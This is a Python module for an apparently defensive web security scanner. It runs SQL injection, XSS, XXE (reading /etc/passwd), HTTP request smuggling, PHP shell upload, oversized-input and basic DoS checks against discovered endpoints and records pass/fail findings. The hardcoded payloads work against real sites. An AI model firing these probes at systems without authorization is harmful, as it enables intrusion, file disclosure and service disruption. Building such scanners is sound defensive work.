"""
Control executors for Module 1.
"""

from __future__ import annotations

import socket
import threading
from dataclasses import dataclass
from typing import Dict, Iterable, List
from urllib.parse import urlparse

import requests

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "admin' --",
    "') OR ('1'='1",
    "'; WAITFOR DELAY '0:0:5'--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\" onmouseover=\"alert(1)",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
]

BUFFER_PAYLOAD = "A" * 8000

INVALID_JSON = {"unexpected": "field", "number": "abc"}
INVALID_XML = """<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>"""

CLIENT_BYPASS_VALUES = {
    "email": "invalid@@example",
    "number": "not-a-number",
    "text": "<script>alert(0)</script>",
}


@dataclass
class ControlResult:
    name: str
    status: str
    findings: List[Dict]


def run_sql_injection(endpoints, session, logger, max_payloads: int = 5) -> ControlResult:
    findings: List[Dict] = []
    for endpoint in filter_param_endpoints(endpoints):
        params = endpoint.get("params") or ["input"]
        for param in params:
            for payload in SQL_PAYLOADS[:max_payloads]:
                resp = send_request(session, endpoint, {param: payload})
                if resp is None:
                    continue
                if detect_sql_error(resp):
                    finding = {
                        "control": "SQL_Injection",
                        "url": endpoint["url"],
                        "param": param,
                        "payload": payload,
                        "status_code": resp.status_code,
                        "indicator": "sql_error_string",
                    }
                    findings.append(finding)
                    logger.warning(f"[SQLi] {endpoint['url']} param={param}")
                    break
            if findings:
                break
    status = "fail" if findings else ("not_tested" if not any(filter_param_endpoints(endpoints)) else "pass")
    return ControlResult("SQL_Injection", status, findings)


def run_xss(endpoints, session, logger, max_payloads: int = 4) -> ControlResult:
    findings: List[Dict] = []
    for endpoint in filter_param_endpoints(endpoints):
        params = endpoint.get("params") or ["input"]
        for param in params:
            for payload in XSS_PAYLOADS[:max_payloads]:
                resp = send_request(session, endpoint, {param: payload})
                if resp is None:
                    continue
                if payload in resp.text:
                    finding = {
                        "control": "XSS",
                        "url": endpoint["url"],
                        "param": param,
                        "payload": payload,
                        "status_code": resp.status_code,
                    }
                    findings.append(finding)
                    logger.warning(f"[XSS] {endpoint['url']} param={param}")
                    break
            if findings:
                break
    status = "fail" if findings else ("not_tested" if not any(filter_param_endpoints(endpoints)) else "pass")
    return ControlResult("XSS", status, findings)


def run_http_smuggling(target: str, logger, timeout: int = 5) -> ControlResult:
    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    findings: List[Dict] = []
    status = "not_tested"
    if not host:
        return ControlResult("HTTP_Smuggling", status, findings)

    request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
        "0\r\n\r\n"
        "GET /smuggle HTTP/1.1\r\n"
        f"Host: {host}\r\n\r\n"
    )
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.sendall(request.encode("utf-8"))
            sock.settimeout(timeout)
            data = sock.recv(1024)
            if b"/smuggle" in data:
                findings.append({"control": "HTTP_Smuggling", "indicator": "response_contains_secondary_request"})
                status = "fail"
            else:
                status = "pass"
    except (socket.timeout, OSError):
        status = "not_tested"

    return ControlResult("HTTP_Smuggling", status, findings)


def run_client_validation(endpoints, session, logger) -> ControlResult:
    candidate_forms = [e for e in endpoints if e.get("form")]
    findings: List[Dict] = []
    if not candidate_forms:
        return ControlResult("Client_Validation", "not_tested", findings)
    for endpoint in candidate_forms:
        payload = {}
        for input_meta in endpoint["form"]["inputs"]:
            name = input_meta.get("name")
            if not name:
                continue
            input_type = input_meta.get("type", "text")
            payload[name] = CLIENT_BYPASS_VALUES.get(input_type, CLIENT_BYPASS_VALUES["text"])
        resp = send_request(session, endpoint, payload)
        if resp is None:
            continue
        if resp.status_code < 400 and not indicates_error(resp):
            findings.append(
                {
                    "control": "Client_Validation",
                    "url": endpoint["url"],
                    "payload": payload,
                    "status_code": resp.status_code,
                }
            )
            logger.warning(f"[ClientValidation] Potential bypass at {endpoint['url']}")
            break
    status = "fail" if findings else "pass"
    return ControlResult("Client_Validation", status, findings)


def run_file_upload(endpoints, session, logger) -> ControlResult:
    upload_forms = [e for e in endpoints if e.get("has_file_input")]
    findings: List[Dict] = []
    if not upload_forms:
        return ControlResult("File_Upload", "not_tested", findings)

    benign = ("safe.txt", b"hello world", "text/plain")
    malicious = ("shell.php", "<?php echo 1;?>".encode(), "application/x-php")
    for endpoint in upload_forms:
        resp_safe = send_request(session, endpoint, files={"file": benign})
        resp_bad = send_request(session, endpoint, files={"file": malicious})
        if resp_bad is None:
            continue
        if resp_bad.status_code < 400 and not indicates_error(resp_bad):
            findings.append(
                {
                    "control": "File_Upload",
                    "url": endpoint["url"],
                    "indicator": "dangerous_extension_accepted",
                    "status_code": resp_bad.status_code,
                }
            )
            logger.warning(f"[Upload] {endpoint['url']} accepted dangerous file")
            break
    status = "fail" if findings else "pass"
    return ControlResult("File_Upload", status, findings)


def run_xml_validation(endpoints, session, logger) -> ControlResult:
    xml_targets = [e for e in endpoints if "xml" in e.get("tags", [])]
    findings: List[Dict] = []
    if not xml_targets:
        return ControlResult("XML_Validation", "not_tested", findings)
    headers = {"Content-Type": "application/xml"}
    for endpoint in xml_targets:
        resp = send_request(session, endpoint, data=INVALID_XML, headers=headers, raw=True)
        if resp is None:
            continue
        if "root:" in resp.text or resp.status_code >= 500:
            findings.append(
                {
                    "control": "XML_Validation",
                    "url": endpoint["url"],
                    "indicator": "possible_xxe",
                    "status_code": resp.status_code,
                }
            )
            logger.warning(f"[XML] Potential XXE at {endpoint['url']}")
            break
    status = "fail" if findings else "pass"
    return ControlResult("XML_Validation", status, findings)


def run_schema_validation(endpoints, session, logger) -> ControlResult:
    json_targets = [e for e in endpoints if "json" in e.get("tags", [])]
    findings: List[Dict] = []
    if not json_targets:
        return ControlResult("Schema_Validation", "not_tested", findings)
    headers = {"Content-Type": "application/json"}
    invalid_payload = INVALID_JSON.copy()
    invalid_payload["number"] = "invalid"
    for endpoint in json_targets[:5]:
        try:
            resp = send_request(session, endpoint, json=invalid_payload, headers=headers)
        except ValueError:
            continue
        if resp is None:
            continue
        if resp.status_code < 400 and not indicates_error(resp):
            findings.append(
                {
                    "control": "Schema_Validation",
                    "url": endpoint["url"],
                    "indicator": "invalid_json_accepted",
                    "status_code": resp.status_code,
                }
            )
            logger.warning(f"[Schema] {endpoint['url']} accepted invalid JSON")
            break
    status = "fail" if findings else "pass"
    return ControlResult("Schema_Validation", status, findings)


def run_content_type(endpoints, logger) -> ControlResult:
    mismatches = []
    for endpoint in endpoints:
        ctype = endpoint.get("content_type", "").lower()
        path = urlparse(endpoint["url"]).path.lower()
        if not ctype:
            mismatches.append({"url": endpoint["url"], "issue": "missing_content_type"})
            continue
        if path.endswith(".json") and "json" not in ctype:
            mismatches.append({"url": endpoint["url"], "issue": "json_extension_but_wrong_ctype"})
        if path.endswith(".xml") and "xml" not in ctype:
            mismatches.append({"url": endpoint["url"], "issue": "xml_extension_but_wrong_ctype"})
        if "text/html" not in ctype and "<html" in endpoint.get("snippet", ""):
            mismatches.append({"url": endpoint["url"], "issue": "html_without_text_html"})
    findings = [{"control": "Content_Type", **m} for m in mismatches]
    status = "fail" if len(mismatches) >= 2 else "pass"
    return ControlResult("Content_Type", status if mismatches else "pass", findings)


def run_buffer_overflow(endpoints, session, logger) -> ControlResult:
    candidates = list(filter_param_endpoints(endpoints))[:5]
    findings: List[Dict] = []
    if not candidates:
        return ControlResult("Buffer_Overflow", "not_tested", findings)
    for endpoint in candidates:
        params = endpoint.get("params") or ["input"]
        param = params[0]
        resp = send_request(session, endpoint, {param: BUFFER_PAYLOAD})
        if resp is None:
            continue
        if resp.status_code >= 500:
            findings.append(
                {
                    "control": "Buffer_Overflow",
                    "url": endpoint["url"],
                    "param": param,
                    "status_code": resp.status_code,
                    "indicator": "server_error_on_large_payload",
                }
            )
            logger.warning(f"[BufferOverflow] {endpoint['url']} error on large input")
            break
    status = "fail" if findings else "pass"
    return ControlResult("Buffer_Overflow", status, findings)


def run_dos(endpoints, session_factory, logger, enabled: bool, max_requests: int = 10, concurrency: int = 5) -> ControlResult:
    if not enabled:
        return ControlResult("DOS_Basic", "not_tested", [])
    candidates = endpoints[:3]
    if not candidates:
        return ControlResult("DOS_Basic", "not_tested", [])

    failures = 0
    total = 0

    def worker(endpoint):
        nonlocal failures, total
        session = session_factory()
        resp = send_request(session, endpoint, {})
        total += 1
        if resp is None or resp.status_code >= 500:
            failures += 1

    threads: List[threading.Thread] = []
    for endpoint in candidates:
        for _ in range(max_requests):
            if len(threads) >= concurrency:
                threads.pop(0).join()
            thread = threading.Thread(target=worker, args=(endpoint,))
            thread.start()
            threads.append(thread)
    for thread in threads:
        thread.join()

    if total == 0:
        return ControlResult("DOS_Basic", "not_tested", [])

    failure_rate = failures / total
    status = "fail" if failure_rate > 0.4 else "pass"
    findings = []
    if status == "fail":
        findings.append({"control": "DOS_Basic", "indicator": "high_error_rate", "failure_rate": failure_rate})
    return ControlResult("DOS_Basic", status, findings)


# --------------------------------------------------------------------------- #
# Helpers


def filter_param_endpoints(endpoints: Iterable[Dict]) -> List[Dict]:
    return [e for e in endpoints if e.get("params") or "param" in e.get("tags", [])]


def send_request(session, endpoint: Dict, params=None, data=None, json=None, files=None, headers=None, raw: bool = False):
    url = endpoint["url"]
    method = endpoint.get("method", "GET").upper()
    params = params or {}
    headers = headers or {}
    try:
        if raw:
            resp = session.post(url, data=data, headers=headers, timeout=10)
        elif method == "GET":
            resp = session.get(url, params=params, headers=headers, timeout=10)
        else:
            if files:
                resp = session.post(url, data=params or data, files=files, headers=headers, timeout=10)
            elif json is not None:
                resp = session.post(url, json=json, headers=headers, timeout=10)
            else:
                payload = params if params else data
                resp = session.post(url, data=payload, headers=headers, timeout=10)
    except requests.RequestException:
        return None
    return resp


def detect_sql_error(response: requests.Response) -> bool:
    body = response.text.lower()
    patterns = [
        "sql syntax",
        "mysql",
        "sqlstate",
        "ora-",
        "postgresql",
        "sqlite",
    ]
    return any(pat in body for pat in patterns) or response.status_code >= 500


def indicates_error(response: requests.Response) -> bool:
    body = response.text.lower()
    return any(keyword in body for keyword in ["error", "invalid", "failed", "required"])

